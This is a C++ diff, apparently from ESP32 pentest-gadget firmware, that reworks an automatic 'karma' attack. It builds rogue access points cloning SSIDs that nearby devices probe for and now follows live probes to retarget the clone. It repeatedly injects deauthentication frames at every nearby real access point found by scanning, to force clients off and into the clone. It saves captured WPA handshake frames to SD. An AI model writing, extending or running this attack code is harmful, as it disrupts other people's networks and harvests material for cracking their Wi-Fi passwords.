@@ -1147,8 +1147,29 @@ static void injectDeauth(const uint8_t* apBssid) {
     esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
 }
 
-// deauth=true (km auto deauth): scan for each target's real AP and deauth its clients
-// on its channel during the bait, so connected devices drop + roam to our clone.
+// ── SSID-keyed helpers for reactive bait (target may be a probe we never harvested) ──
+static int kmFindNet(const char* ssid) {
+    for (int i = 0; i < s_netCount; i++) if (strcmp(s_nets[i].ssid, ssid) == 0) return i;
+    return -1;
+}
+static bool kmBaitable(const char* ssid) {            // unknown SSIDs are baitable
+    int i = kmFindNet(ssid);
+    return (i < 0) ? true : !s_nets[i].captured;
+}
+static void kmMarkCaptured(const char* ssid) {        // add a row if reactively captured an unharvested SSID
+    int i = kmFindNet(ssid);
+    if (i < 0 && s_netCount < KM_NET_MAX) {
+        i = s_netCount++;
+        KmNet& n = s_nets[i];
+        strncpy(n.ssid, ssid, 32); n.ssid[32] = '\0';
+        n.devs = 0; n.hits = 0; n.lastBaitMs = millis();
+    }
+    if (i >= 0) s_nets[i].captured = true;
+}
+
+// deauth=true (km auto deauth): also deauth nearby present APs so devices drop + probe.
+// Reactive: while baiting one SSID we follow live probes — if a device probes for a
+// different un-captured SSID, retarget the clone to it on the spot (silent, no deauth).
 static void karmaAuto(bool deauth) {
     DisplayManager& dm = displayManager;
     if (!ensureBuffers()) {
@@ -1208,49 +1229,65 @@ static void karmaAuto(bool deauth) {
         }
         int total = m < KM_AUTO_TOP ? m : KM_AUTO_TOP;
 
-        // deauth-assist: resolve each target's real AP (BSSID+channel) via one scan,
-        // done HERE while promiscuous is off (post-harvestStop) and before the engine is up.
-        struct RealAp { uint8_t bssid[6]; uint8_t ch; bool found; } realT[KM_AUTO_TOP];
-        for (int i = 0; i < total; i++) realT[i].found = false;
+        // deauth-assist: scan nearby PRESENT APs once (post-harvestStop, promiscuous off).
+        // The baited SSIDs come from probe requests = networks devices WANT but aren't on,
+        // so their APs usually aren't here. Instead we deauth the APs devices ARE on, to
+        // force them to disconnect and PROBE their saved list — then they discover our
+        // clones of those absent SSIDs. So the deauth target is the present APs, not the bait.
+        struct ApInfo { uint8_t bssid[6]; uint8_t ch; } aps[24];
+        int apCount = 0;
         if (deauth) {
             dm.clearScreen(); dm.setCursor(4, outputY); dm.setTextColor(TFT_CYAN);
-            dm.println("Scanning for real APs...");
+            dm.println("Scanning nearby APs to deauth...");
             int sc = WiFi.scanNetworks();
-            for (int i = 0; i < total; i++) {
-                for (int k = 0; k < sc; k++) {
-                    if (WiFi.SSID(k).equals(s_nets[idx[i]].ssid)) {
-                        memcpy(realT[i].bssid, WiFi.BSSID(k), 6);
-                        realT[i].ch = (uint8_t)WiFi.channel(k);
-                        realT[i].found = true;
-                        break;
-                    }
-                }
+            for (int k = 0; k < sc && apCount < 24; k++) {
+                memcpy(aps[apCount].bssid, WiFi.BSSID(k), 6);
+                aps[apCount].ch = (uint8_t)WiFi.channel(k);
+                apCount++;
             }
             WiFi.scanDelete();
         }
+        bool dzActive = deauth && apCount > 0;
 
         bool engineUp = false;
+        int  dRot = 0;                                                // rotates which present AP we kick
         for (int i = 0; i < total && !quit; i++) {
             int ni = idx[i];
             char target[33]; strncpy(target, s_nets[ni].ssid, 32); target[32] = '\0';
             s_nets[ni].lastBaitMs = millis();                         // mark baited (rotation)
-            bool dz = deauth && realT[i].found;                       // deauthing this target?
-            uint8_t baitCh = dz ? realT[i].ch : KM_AUTO_BAIT_CH;      // sit on the real AP's channel
             // Bring the AP up ONCE per sweep, then just retarget — no per-target WiFi churn.
-            if (!engineUp) { if (!roguehs::begin(target, baitCh)) continue; engineUp = true; }
-            else           { roguehs::retarget(target, baitCh); }
-            uint32_t t0b = millis(), lastDraw = 0, lastDeauth = 0;
+            if (!engineUp) { if (!roguehs::begin(target, KM_AUTO_BAIT_CH)) continue; engineUp = true; }
+            else           { roguehs::retarget(target, KM_AUTO_BAIT_CH); }
+            char curTarget[33]; strncpy(curTarget, target, sizeof(curTarget)); curTarget[32] = '\0';
+            uint32_t t0b = millis(), lastDraw = 0, lastDeauth = 0, lastSwitch = millis();
             while (!quit) {
                 roguehs::poll();
                 const roguehs::State& st = roguehs::state();
                 uint32_t now = millis();
                 if (st.gotM2) break;                                  // captured → next target
                 if (now - t0b >= KM_AUTO_BAIT_MS) break;              // timed out → next target
-                if (dz && now - lastDeauth > 600) {                  // kick the real AP's clients
-                    injectDeauth(realT[i].bssid); injectDeauth(realT[i].bssid); lastDeauth = now;
+                // reactive: a device just probed for a different un-captured SSID, and the
+                // current target has no association in progress → follow the probe.
+                if (st.assocs == 0 && now - lastSwitch > 1500) {
+                    char hint[33];
+                    if (roguehs::nextProbeHint(hint, sizeof(hint)) &&
+                        strcmp(hint, curTarget) != 0 && kmBaitable(hint)) {
+                        roguehs::retarget(hint, KM_AUTO_BAIT_CH);
+                        strncpy(curTarget, hint, sizeof(curTarget)); curTarget[32] = '\0';
+                        int hi = kmFindNet(curTarget); if (hi >= 0) s_nets[hi].lastBaitMs = now;
+                        t0b = now; lastSwitch = now; lastDraw = 0;
+                        continue;
+                    }
+                }
+                if (dzActive && now - lastDeauth > 800) {            // kick a present AP so its clients re-scan
+                    ApInfo& ap = aps[dRot % apCount];
+                    esp_wifi_set_channel(ap.ch, WIFI_SECOND_CHAN_NONE);
+                    injectDeauth(ap.bssid); injectDeauth(ap.bssid);
+                    esp_wifi_set_channel(KM_AUTO_BAIT_CH, WIFI_SECOND_CHAN_NONE);  // back to the clone's channel
+                    dRot++; lastDeauth = now;
                 }
                 if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
-                if (now - lastDraw > 300) { autoDrawTable(target, KM_AUTO_BAIT_MS - (now - t0b), i + 1, total, caps, &st, 0, dz); lastDraw = now; }
+                if (now - lastDraw > 300) { autoDrawTable(curTarget, KM_AUTO_BAIT_MS - (now - t0b), i + 1, total, caps, &st, 0, dzActive); lastDraw = now; }
                 char k = inputHandler.getKeyboardInput();
                 if (k == 'q' || k == 'Q') { quit = true; break; }
                 else if (k == 'v' || k == 'V') {            // view captured; don't penalize bait timer
@@ -1260,8 +1297,8 @@ static void karmaAuto(bool deauth) {
             }
             if (roguehs::state().gotM2) {                            // GDMA: pause promiscuous for the SD write
                 const roguehs::State& s = roguehs::state();
-                { ScopedPromiscPause _; karmaSaveCap(target, s, nullptr, 0); autoLogConnect(target, s.staMac); }
-                s_nets[ni].captured = true;                           // skip it from now on
+                { ScopedPromiscPause _; karmaSaveCap(curTarget, s, nullptr, 0); autoLogConnect(curTarget, s.staMac); }
+                kmMarkCaptured(curTarget);                            // skip it from now on (adds row if reactive/new)
                 caps++;
             }
         }
